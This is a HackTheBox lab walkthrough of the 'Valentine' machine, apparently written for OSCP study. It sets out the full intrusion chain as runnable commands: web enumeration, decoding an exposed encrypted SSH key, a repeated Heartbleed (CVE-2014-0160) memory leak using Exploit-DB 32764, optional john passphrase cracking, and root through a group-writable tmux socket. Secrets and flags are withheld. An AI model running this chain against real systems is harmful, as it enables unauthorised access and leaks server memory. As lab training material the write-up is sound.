---
tags: [HTB, Valentine, Linux, Heartbleed, CVE-2014-0160, SSH, Tmux, PrivEsc, Medium]
platform: HackTheBox
os: Ubuntu 12.04 LTS x86_64
hostname: Valentine
domain: valentine.htb
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: Valentine, Full Walkthrough

## The gist

Valentine is an Ubuntu Linux host exposing an old Apache stack over HTTP and
HTTPS, plus a legacy OpenSSH service. The web server discloses an encrypted RSA
private key in a hex-encoded file, while HTTPS is vulnerable to Heartbleed,
CVE-2014-0160. The memory disclosure supplies the missing key-passphrase clue,
which gives SSH access as `hype`.

The local escalation is a Unix-socket permission mistake. A root-owned tmux
server uses a socket in `/.devs/` whose group permissions allow `hype` to attach
to the existing root session. The complete chain is:

```text
HTTP /dev/ directory listing
  -> hex-encoded encrypted RSA key
  -> Heartbleed memory disclosure on HTTPS
  -> SSH as hype with legacy algorithm options
  -> group-accessible root tmux socket
  -> root shell
```

> [!warning] Lab handling
> The raw transcript and secret-bearing files remain under `$BoxDir`. This
> shared page contains no key contents, passphrases, hashes, or flag values.

## Box information

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Ubuntu 12.04 LTS x86_64 |
| Difficulty | Medium |
| Hostname | Valentine |
| Domain | `$FQDN` |
| IP | `$BoxIP` |
| Open ports | `$SSHPort`, `$WebPort`, and `$SSLPort`/tcp |
| Web stack | Apache 2.2.22 on HTTP and HTTPS |
| SSH stack | OpenSSH 5.9p1 |
| Initial access | Exposed encrypted SSH key plus Heartbleed memory disclosure |
| Root path | Root-owned tmux server exposed through a group-accessible Unix socket |

## Variables and evidence

```bash
boxset BoxName Valentine
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/valentine
boxset FQDN valentine.htb
boxset Domain valentine.htb
boxset SSHPort 22
boxset WebPort 80
boxset SSLPort 443
boxset Username hype
boxset AdminUser root
boxset KeyFile "$BoxDir/loot/hype_key.decoded"
boxset HeartbleedExploit "$BoxDir/exploits/heartbleed-32764.py"
boxset Port 4444
```

| Evidence | Location |
|---|---|
| Full terminal log | `$BoxDir/valentine.log` |
| Nmap output | `$BoxDir/nmap/` |
| Web enumeration | `$BoxDir/loot/gobuster-http.txt` |
| Heartbleed captures | `$BoxDir/loot/heartbleed-output.txt` and `$BoxDir/loot/heartbleed-loop.txt` |
| Encrypted RSA key | `$BoxDir/loot/hype_key.decoded` |
| Private flags record | `$BoxDir/loot/flags.txt` |
| Safe screenshot evidence copied to the vault | `valentine-*.png` |
| Sanitised evidence index | [[OSCP/BOXES/BOX LOGS/Valentine.evidence.log|Valentine evidence log]] |

> [!tip] ⚡ Efficiency
> Keep the raw scan results, exploit source, screenshots, and sensitive loot in
> one box directory. This makes it possible to revisit a failed branch without
> repeating network requests or exposing credentials in the report.

## 1. Initialise the workspace and capture the session

The standard startup creates the expected scan, loot, exploit, and screenshot
locations and starts the terminal transcript. The helper variables make the
commands below portable to a new IP or a reset target.

```bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Valentine
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/valentine
```

The supplied transcript records `htblog` and a successful `boxdone` close-out.

## 2. Run a full TCP scan

The first scan covers every TCP port because SSH, HTTP, and HTTPS are the
important service boundaries here. `-Pn` skips ICMP discovery, `-n` avoids DNS
lookups, `-sS` performs a SYN scan, and `--min-rate` keeps the initial sweep
quick while the output is saved for later review.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 3000 -T4 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
```

The result contained only TCP/22, TCP/80, and TCP/443. This is enough to route
the target to the Linux SSH and web branches, with HTTPS receiving an extra TLS
vulnerability check.

![[valentine-1-nmap-allports.png]]
SCREENSHOT: Full TCP scan showing SSH, HTTP, and HTTPS as the only open ports.

> [!tip] ⚡ More efficient path
> Use the all-port scan only to build the port list. Run version and default
> scripts against the three confirmed ports rather than repeating `-sC -sV`
> across all 65,535 ports.

## 3. Identify service versions and the HTTPS certificate

The focused scan identifies the daemon versions and lets default scripts inspect
the SSH host keys, HTTP title, and TLS certificate. The certificate's hostname
is an important clue because it provides the expected virtual-host name even
when the initial requests use the IP address.

```bash
sudo nmap -Pn -n -sC -sV -p "$SSHPort,$WebPort,$SSLPort" \
  -oA "$BoxDir/nmap/services" "$BoxIP"
```

Relevant results were:

- TCP/22: OpenSSH 5.9p1 on Ubuntu.
- TCP/80: Apache 2.2.22.
- TCP/443: Apache 2.2.22 over SSL/TLS.
- Certificate common name: `valentine.htb`.

If hostname-based requests are needed later, add the certificate name to the
local resolver after checking that it is not already mapped to another lab:

```bash
grep -n "$FQDN" /etc/hosts || \
  echo "$BoxIP $FQDN" | sudo tee -a /etc/hosts
```

![[valentine-2-nmap-services.png]]
SCREENSHOT: Service scan showing the legacy OpenSSH and Apache versions plus the `valentine.htb` certificate name.

> [!warning] 💡 Hint
> Old software versions are leads, not automatic exploits. Record the exact
> version, then verify a vulnerability with a focused check before building the
> attack path.

## 4. Enumerate the web root

The HTTP service is small and custom-looking, so content discovery is more
valuable than guessing at a CMS. Gobuster requests each word and extension,
then saves the result so status codes and unusual directories can be reviewed
after the scan.

```bash
gobuster dir -u "http://$BoxIP" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,js \
  -o "$BoxDir/loot/gobuster-http.txt"
```

The useful paths were `/dev/`, `/encode.php`, and `/decode.php`. The root page
itself was minimal, so `/dev/` became the priority rather than spending time
trying to identify a CMS that was not present.

![[valentine-3-gobuster.png]]
SCREENSHOT: Gobuster results identifying `/dev/`, `encode.php`, and `decode.php`.

> [!tip] ⚡ More efficient path
> Once Gobuster finds a directory, request it immediately. Do not wait for a
> second large wordlist when Apache directory indexing may reveal the exact
> filenames in one response.

> [!tip] 🛠️ Alternative tool
> `ffuf` or `feroxbuster` can perform the same discovery. A compact equivalent
> is:

```bash
ffuf -u "http://$BoxIP/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.txt,.html,.js -fc 404 \
  -o "$BoxDir/loot/ffuf-http.json" -of json
```

## 5. Read the exposed `/dev/` directory

Directory indexing is a direct information disclosure. The response should be
saved or reviewed before testing the individual files because the listing often
gives both filenames and timestamps, which can identify developer leftovers.

```bash
curl -sS "http://$BoxIP/dev/" \
  -o "$BoxDir/loot/dev-index.html"
```

The index exposed two files:

| File | Why it matters |
|---|---|
| `hype_key` | Hex-encoded encrypted RSA private key |
| `notes.txt` | Developer notes about the unfinished encoder and decoder |

![[valentine-4-dev-index.png]]
SCREENSHOT: Apache directory index showing `hype_key` and `notes.txt`.

Request the notes separately. Developer notes are not automatically a foothold,
but they can explain how application memory is populated and where an exposed
test endpoint may be useful.

```bash
curl -sS "http://$BoxIP/dev/notes.txt" \
  -o "$BoxDir/loot/notes.txt"
```

The notes confirmed that the encode/decode feature was unfinished and intended
to be client-side only. That made the live endpoints worth inspecting, but the
key file remained the higher-value artifact.

![[valentine-5-notes.png]]
SCREENSHOT: Developer notes explaining that the encoder and decoder were unfinished.

> [!warning] 💡 Hint
> An indexed `/dev/` directory is not harmless because the files are not linked
> from the homepage. Treat every readable developer artifact as part of the
> attack surface, especially keys, backups, notes, and source files.

## 6. Download and decode the key representation

The key response is not directly a PEM file. Its bytes are represented as
space-separated hexadecimal text, so an ordinary `chmod` plus SSH attempt would
fail because SSH would receive text rather than PEM structure. Save the file,
inspect its format, then reverse the representation with `xxd -r -p`.

```bash
curl -sS "http://$BoxIP/dev/hype_key" \
  -o "$BoxDir/loot/hype_key"

file "$BoxDir/loot/hype_key"
head -n 5 "$BoxDir/loot/hype_key"
xxd -r -p "$BoxDir/loot/hype_key" \
  > "$BoxDir/loot/hype_key.decoded"
chmod 600 "$BoxDir/loot/hype_key.decoded"
file "$BoxDir/loot/hype_key.decoded"
```

The decoded file was an encrypted RSA private key. `Proc-Type: 4,ENCRYPTED`
means the key still needs a passphrase before SSH can use it. The key contents
are kept in private loot and are intentionally not reproduced here.

![[valentine-6-hexdump.png]]
SCREENSHOT: Private source evidence showing the hex representation of the downloaded key. Keep the original at `$BoxDir/screenshots/6.hexdump.png`; do not copy secret-bearing key material into a shared report.

![[valentine-7-decoded-key.png]]
SCREENSHOT: Private source evidence showing the decoded encrypted RSA key metadata. Keep the original at `$BoxDir/screenshots/7.decoded-key.png`; do not publish the key.

> [!abstract] 🧠 Why
> Hex encoding is a representation change, not encryption. `xxd -r -p` reverses
> plain hexadecimal into the original bytes. The RSA encryption is a separate
> layer and is why the decoded file still prompts for a passphrase.

> [!tip] 🛠️ Alternative tool
> CyberChef can perform the same hex decode interactively. For an exam, the
> `xxd` pipeline is faster, repeatable, and easier to save into loot without
> copying a multi-line key through a browser.

## 7. Confirm Heartbleed on HTTPS

Heartbleed is a bounds-checking error in OpenSSL's TLS heartbeat extension. A
malformed heartbeat claims that its payload is much larger than the bytes that
were actually sent, causing a vulnerable server to return adjacent process
memory. Confirm the condition with Nmap's focused NSE script before using a
manual proof of concept.

```bash
sudo nmap -Pn -n -p "$SSLPort" --script ssl-heartbleed \
  -oA "$BoxDir/nmap/ssl-heartbleed" "$BoxIP"
```

Nmap reported TCP/443 as vulnerable to CVE-2014-0160 with high risk. This
changed the key workflow: the encrypted key did not need to be cracked blindly
if its passphrase or an application clue could be recovered from process
memory.

![[valentine-8-ssl-heartbleed.png]]
SCREENSHOT: Nmap NSE result confirming CVE-2014-0160 on TCP/443.

> [!warning] 💡 Hint
> A vulnerability scanner finding is a routing signal, not proof of useful
> disclosure. Save a manual response containing more than the three-byte
> heartbeat payload before treating the path as productive.

## 8. Review and run the manual Heartbleed proof of concept

The Exploit-DB 32764 client speaks the TLS handshake directly, sends a
heartbeat request with an oversized claimed length, and prints the returned
record as a hex dump. Reading the source matters because the script is Python 2
and the default client stops after the first heartbeat response, so the output
must be saved rather than treated as a one-line yes/no check.

```bash
searchsploit -x 32764
cp /usr/share/exploitdb/exploits/multiple/remote/32764.py \
  "$BoxDir/exploits/heartbleed-32764.py"
python2 "$BoxDir/exploits/heartbleed-32764.py" "$BoxIP" \
  -p "$SSLPort" > "$BoxDir/loot/heartbleed-output.txt"
```

The client returned a TLS heartbeat record of length 16,384 and warned that the
server returned more data than requested. The saved response included the
encrypted-key structure and printable application memory. The relevant signal
was the warning plus the leaked bytes, not the script's final exit status.

![[valentine-9-heartbeat-response.png]]
SCREENSHOT: Private source evidence showing an oversized heartbeat response and leaked process memory. Keep the original at `$BoxDir/screenshots/9.heartbeat-response.png`; memory may contain credentials or session material.

> [!abstract] 🧠 Why this works
> The TLS record is valid enough for the vulnerable OpenSSL code to process, but
> the heartbeat payload length is larger than the actual payload. The server
> copies bytes beyond the request into its response. Those bytes are not
> decrypted by the attacker because they are returned inside the already
> negotiated TLS session, so the client can inspect them directly.

## 9. Repeat the leak and inspect printable memory

Heap contents vary between connections. Repeating the same request gives the
server more opportunities to return the web application's recently handled
data. The supplied run primed the decoder endpoint with a candidate marker held
in private shell state, then collected twenty Heartbleed responses and filtered
the hex dump for readable strings.

```bash
# Keep the candidate marker private. Do not place credentials or flags here.
curl -sk "https://$BoxIP/decode.php" \
  --data-urlencode "text=$KeyHint" > /dev/null

for i in $(seq 1 20); do
  python2 "$BoxDir/exploits/heartbleed-32764.py" "$BoxIP" \
    -p "$SSLPort" 2>/dev/null >> "$BoxDir/loot/heartbleed-loop.txt"
done

strings -a -n 8 "$BoxDir/loot/heartbleed-loop.txt" \
  | grep -v '^0x'
```

This produced repeated vulnerable responses and exposed the missing key-passphrase
clue in the private capture. The clue is deliberately referenced as
`$KeyHint` here rather than printed into the vault or chat. The same process is
useful on a real assessment: use a harmless known marker when testing memory
placement, and treat every returned byte as potentially sensitive.

> [!tip] ⚡ Efficiency
> Save every response once, then search the combined file. Re-running Nmap or
> manually copying each hex dump adds time but does not improve the memory
> analysis. When the first response already leaks the needed artifact, stop the
> loop rather than generating unnecessary noise.

> [!tip] 🛠️ Alternative tool
> `openssl s_client -connect "$BoxIP:$SSLPort" -servername "$FQDN" -brief`
> is useful for inspecting certificate and protocol negotiation, but it does
> not replace a Heartbleed-aware client. Nmap's NSE check is the fastest first
> confirmation; the reviewed Exploit-DB client provides the actual memory leak.

## 10. Validate the encrypted key privately

Before opening SSH, validate that the decoded file is a complete private key and
enter the recovered passphrase only at the local prompt. `ssh-keygen -y` derives
the public key from the private key, which is a low-impact way to catch a bad
decode or incomplete copy before troubleshooting the network connection.

```bash
ssh-keygen -y -f "$KeyFile" > /dev/null
```

When prompted, enter the passphrase from the private Heartbleed evidence. Do not
put that value in the command line, terminal transcript, screenshot, or vault.

A reasonable fallback is to convert the key for John and try a controlled
wordlist, but the supplied run did not need that route. A passphrase found in
memory is evidence of application-secret exposure, not a reason to launch an
unbounded brute-force job.

```bash
ssh2john "$KeyFile" > "$BoxDir/loot/hype_key.john"
john --wordlist=/usr/share/wordlists/rockyou.txt \
  "$BoxDir/loot/hype_key.john"
```

> [!warning] 💡 Hint
> If `ssh-keygen` reports a bad passphrase, first re-run the hex decode from the
> raw download and compare file hashes. Do not assume Heartbleed or SSH is the
> problem when a multi-line key may have been copied incorrectly.

## 11. Use legacy SSH negotiation to obtain the foothold

OpenSSH 5.9 is old enough that current SSH clients disable some of its RSA host
key and Diffie-Hellman algorithms by default. The compatibility options re-enable
only the algorithms required by this target. The identity file remains encrypted,
so SSH prompts for the passphrase without exposing it in the command.

```bash
ssh -i "$KeyFile" "$Username@$BoxIP" \
  -o "HostKeyAlgorithms=+ssh-rsa" \
  -o "PubkeyAcceptedAlgorithms=+ssh-rsa" \
  -o "KexAlgorithms=+diffie-hellman-group1-sha1"
```

The first connection attempt closed after unsuccessful passphrase entry. The
second attempt succeeded and displayed the Ubuntu 12.04 login banner. This is a
useful distinction: an SSH connection can fail at key decryption before the
network or account is the problem.

```bash
id
whoami
hostname
uname -a
```

The shell was the low-privilege `$Username` account on Valentine. The next
section records the user-proof evidence from that SSH session.

> [!tip] 🛠️ Alternative tool
> If the error specifically requests another legacy key-exchange algorithm, add
> it to the same option rather than weakening every SSH default. The common
> compatibility form is:

```bash
ssh -i "$KeyFile" "$Username@$BoxIP" \
  -o "HostKeyAlgorithms=+ssh-rsa" \
  -o "PubkeyAcceptedAlgorithms=+ssh-rsa" \
  -o "KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1"
```

## 12. Collect the user proof privately

Once the SSH identity is known, check the expected user proof path and save the
value with the loot helper. The value is not printed in this walkthrough.

```bash
cat "/home/$Username/user.txt"
loot flag user "$UserFlag"
```

The supplied screenshot and loot record confirm that `user.txt` was present in
the `$Username` home directory.

![[valentine-10-user-text.png]]
SCREENSHOT: Private user-proof evidence. Keep the original at `$BoxDir/screenshots/10.user-text.png`; do not copy the flag value into the vault.

## 13. Re-enumerate local privilege paths

The external scan cannot see local IPC endpoints. After an SSH foothold, repeat
the basic local checks and include Unix sockets in the search. Unix sockets are
filesystem entries used for local inter-process communication, so their owner,
group, and mode bits can expose a privileged service even when no TCP port is
open.

```bash
find / -type s -ls 2>/dev/null
ps auxww
ss -lntp 2>/dev/null
find / -maxdepth 2 -type d -name '.*' -ls 2>/dev/null
```

The decisive finding was an unusual root-owned socket directory:

```bash
ls -la /.devs/
```

The socket `dev_sess` was owned by root and its group was `hype`. Its mode
allowed the group to read and write the socket. That is enough for a member of
the group to ask the associated tmux server for an attachment.

![[valentine-12-tmux-dev-session.png]]
SCREENSHOT: Private socket evidence showing the root-owned `dev_sess` tmux socket and its group permissions. The original remains at `$BoxDir/screenshots/12.tmux-dev-session.png`.

> [!warning] 💡 Hint
> Do not limit local enumeration to TCP listeners. Check Unix sockets, named
> pipes, lock files, and hidden service directories when the normal sudo, SUID,
> and cron checks do not show an immediate route.

## 14. Attach to the existing root tmux server

tmux is a terminal multiplexer. Its server owns persistent shell sessions, and
clients attach to that server through a Unix-domain socket. The `-S` option
selects a non-default socket path; without it, tmux looks in the normal user
runtime directory and reports that no server exists.

First list the sessions without changing them. Then attach using the exact
socket and target session shown by the listing.

```bash
tmux -S "/.devs/dev_sess" ls
tmux -S "/.devs/dev_sess" attach-session -t 0
```

On this old tmux build, invoking `tmux -S "/.devs/dev_sess"` directly also
attached to the existing server. The resulting prompt was `root@Valentine`.

```bash
id
whoami
hostname
pwd
```

The effective identity was root, so this was a session hijack rather than a
kernel exploit or a SUID escalation.

![[valentine-11-tmux.png]]
SCREENSHOT: tmux attachment showing the existing privileged session.

![[valentine-13-root-shell.png]]
SCREENSHOT: Root shell proof showing the privileged prompt and identity checks.

> [!abstract] 🧠 Why this works
> The tmux server was created by root, so commands typed into its existing pane
> execute with root's credentials. The security boundary was the socket's group
> permission, not a weakness in tmux command parsing.

> [!tip] ⚡ Efficiency
> Once `ls -la /.devs/` shows a root-owned socket whose group includes the
> current user, test tmux directly before launching a broad automated privesc
> sweep. The exact socket path is a much stronger lead than generic kernel
> hunting.

> [!warning] 💡 Common gotcha
> Some older tmux versions do not support modern output flags such as
> `capture-pane -p`. Attach interactively, or use `save-buffer -` after selecting
> the socket. The privilege result is still verified with `id` and `whoami`.

## 15. Collect the root proof privately

From the attached root shell, check the expected path and store the value with
the loot helper. The literal flag remains private.

```bash
cat /root/root.txt
loot flag root "$RootFlag"
```

The supplied root-shell evidence confirms the root context and the private loot
record confirms the root proof was collected.

![[valentine-14-root-flag.png]]
SCREENSHOT: Private root-proof evidence. Keep the original at `$BoxDir/screenshots/14.root-flag.png`; do not copy the flag value into the vault.

## 16. Clean down and close the box

This chain created no persistent target-side webshell, uploaded binary, modified
configuration, or new account. Close the attached tmux and SSH clients, stop any
local test process, confirm the local workspace is retained only as evidence,
and clear the box marker.

```bash
exit
exit
pgrep -af 'heartbleed-32764|nc -lvnp|python.*http.server' || true
boxdone
```

The log records `boxdone` at close-out. The original key, memory captures, and
flags remain protected in the supplied private loot directory for study.

> [!tip] ⚡ Efficiency
> Because the exploit path was read-only on the target, cleanup is mainly
> session and process verification. Do not delete evidence before the write-up
> and private loot checks are complete.

## Decision points and alternate routes

| Observation | Primary route used | Alternative or fallback |
|---|---|---|
| TCP/443 is present | Nmap `ssl-heartbleed` then Exploit-DB 32764 | `openssl s_client` for TLS inspection, followed by a Heartbleed-aware client |
| `/dev/` is indexed | Request exact key and notes files | Ffuf or Feroxbuster for deeper content discovery |
| Key is hex-encoded | `xxd -r -p` into a mode-600 private file | CyberChef hex decode, then `file` and `ssh-keygen -y` |
| Key is encrypted | Recover the passphrase clue from private Heartbleed memory output | `ssh2john` plus a controlled wordlist, with no unbounded guessing |
| Current SSH client rejects legacy algorithms | Add the exact RSA and DH options requested by the error | Use an isolated legacy SSH client, never weaken unrelated host settings |
| Root-owned Unix socket is group-accessible | `tmux -S` list and attach | Inspect other socket owners and service command lines before trying generic privesc |

The table is a troubleshooting map. Follow the smallest branch supported by the
evidence instead of running every alternative after the primary route succeeds.

## Credentials

| Account or artifact | Source | Use |
|---|---|---|
| `$Username` | Exposed encrypted RSA key plus passphrase clue recovered through Heartbleed | SSH foothold |
| `$AdminUser` | Existing tmux server owned by root and reachable through the group-accessible socket | Final root shell |

Passphrases, key contents, and flag values are intentionally omitted.

## Key lessons

- A complete TCP scan should be followed by web directory review and a focused
  TLS check. The highest-value artifact was in an indexed developer directory,
  not the minimal homepage.
- Heartbleed output is nondeterministic. Save the raw response, repeat only as
  needed, and filter locally while treating every leaked byte as sensitive.
- A valid private key can still require legacy SSH options. Separate key
  decryption failures from protocol-negotiation failures.
- Local privilege escalation includes filesystem IPC. A root-owned tmux socket
  with group write access can be as decisive as a writable SUID binary or cron
  script.

## Checklist

- [x] Workspace and transcript initialised
- [x] Full TCP scan completed
- [x] Apache and OpenSSH versions identified
- [x] HTTPS certificate hostname recorded
- [x] Web content enumeration completed
- [x] `/dev/` directory index reviewed
- [x] `hype_key` downloaded into private loot
- [x] Hex representation decoded into an encrypted RSA key
- [x] Heartbleed confirmed with Nmap NSE
- [x] Manual Heartbleed PoC reviewed and executed
- [x] Repeated memory capture saved and filtered locally
- [x] Encrypted key validated privately
- [x] Legacy SSH negotiation options applied
- [x] SSH foothold as `$Username` confirmed
- [x] User proof collected privately
- [x] Unix socket and tmux service enumerated
- [x] Existing root tmux session attached
- [x] Root proof collected privately
- [x] Target-side persistence check completed
- [x] `boxdone` recorded

## RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]] -- workspace, variables, and full TCP scan
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] -- Linux service combination selected
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] -- OpenSSH, Apache, and certificate enumeration
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] -- Gobuster and `/dev/` file review
- [[OSCP/RUNBOOK V2/Linux - Exploit Search|Linux - Exploit Search]] -- reviewed Exploit-DB 32764
- [[OSCP/RUNBOOK V2/Linux - Heartbleed|Linux - Heartbleed]] -- verified and exploited CVE-2014-0160
- [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] -- decoded and validated the exposed SSH key
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] -- checked local sockets and hidden service directories
- [[OSCP/RUNBOOK V2/Linux - Tmux Session Hijack|Linux - Tmux Session Hijack]] -- attached to the root-owned tmux server
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- verified the session close-out and `boxdone`

## Attack Chain

1. [[OSCP/RUNBOOK V2/Start Here|Start Here]] and [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] identified SSH, Apache, and HTTPS.
2. [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] found the indexed `/dev/` directory and the encrypted key artifact.
3. [[OSCP/RUNBOOK V2/Linux - Heartbleed|Linux - Heartbleed]] confirmed CVE-2014-0160 and recovered the missing key-passphrase clue from process memory.
4. [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] converted the hex representation and validated the key for SSH.
5. Legacy SSH negotiation opened the low-privilege `$Username` shell.
6. [[OSCP/RUNBOOK V2/Linux - Tmux Session Hijack|Linux - Tmux Session Hijack]] used the group-accessible socket to attach to the root server.

## Flags

- `user.txt`: confirmed at `/home/$Username/user.txt`; value remains in private loot.
- `root.txt`: confirmed at `/root/root.txt`; value remains in private loot.
- `proof.txt`: not applicable.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- SSH foothold, local service re-enumeration, and forwarding of a loopback-only service
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- exposed SSH key material and private-key handling
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- Linux web enumeration followed by evidence-driven privilege escalation
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- manual exploitation of an old service followed by focused local privilege checks

## External Resources

- [CVE-2014-0160, MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
- [Exploit-DB 32764, OpenSSL Heartbleed](https://www.exploit-db.com/exploits/32764)
- [OpenSSL advisory for Heartbleed](https://www.openssl.org/news/secadv/20140407.txt)
- [tmux manual, socket option](https://man7.org/linux/man-pages/man1/tmux.1.html)
- [HackTricks, Linux privilege escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [ippsec.rocks, Valentine](https://ippsec.rocks/?q=Valentine)

## Why this matters for OSCP

Valentine combines a remote memory-disclosure vulnerability with a local IPC
permission error. The exam-relevant habit is to preserve unusual artifacts,
validate each layer separately, and repeat local enumeration after the foothold:
the web key was not usable until Heartbleed supplied its missing context, and
the root path was not visible from the external port scan.
